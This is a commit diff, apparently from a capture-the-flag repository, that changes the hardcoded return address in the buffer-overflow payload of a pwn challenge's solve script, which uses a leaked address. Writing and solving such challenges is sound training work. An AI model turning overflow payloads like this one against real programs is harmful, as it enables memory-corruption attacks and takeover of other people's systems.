832c0a0eda57c598c28941422ec1eedf73c22636
aparker <aparker314159@gmail.com>
2024-04-22 23:00:02 -0400

    dockerized chal

--- pwn/ready_aim_fire/solve.py
+++ pwn/ready_aim_fire/solve.py
@@ -8,7 +8,7 @@ io.recvuntil(b"cannon!\n")
 leak = int(io.recvline(), 16)
 print(hex(leak))
 
-payload = b'A'*44 + p64(leak + 20) + p64(0x4014e7) #4012e4 works
+payload = b'A'*44 + p64(leak + 20) + p64(0x402547) #4012e4 works
 #payload = b'A'*32 
 io.sendline(payload)
 
